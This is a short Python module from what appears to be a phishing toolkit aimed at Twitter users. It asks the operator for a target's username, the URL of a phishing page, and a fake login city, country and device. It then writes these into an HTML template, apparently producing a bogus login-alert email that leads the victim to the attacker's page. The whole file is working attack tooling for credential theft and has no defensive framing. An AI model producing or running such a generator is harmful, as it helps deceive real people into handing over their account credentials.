from Modules.UI import *

def pageParser():
    clear()
    banner()
    clear()
    banner()
    print(style.YELLOW('--Fill the folowing credentials for Twitter phishing email--'))
    print(style.GREEN('\n[+]') + style.RESET("Enter the target's Twitter username:"))
    pageParser.targetUsername  = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET("Enter you'r phishing page URL:"))
    pageParser.redirectURL = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET('Enter the  login city:'))
    pageParser.loginCity   = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET('Enter the login country: '))
    pageParser.loginCountry = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET('Enter the device type (EG: Windows, Linux, Iphone, Android...): '))
    pageParser.device = str(input(style.CYAN(">>> ") + style.RESET('')))


def pageGenerator_TW():
    pageParser()
    fin = open("Templates/Twitter.html", "rt")
    fout = open("Templates/TempTemplates/TwitterTemplate.html", "wt")
    for line in fin:
        fout.write(line.replace('#USERNAME', pageParser.targetUsername).replace('#URL', pageParser.redirectURL).replace('#CITY', pageParser.loginCity).replace("#COUNTRY", pageParser.loginCountry).replace('#DEVICE', pageParser.device))
    fin.close()
    fout.close()
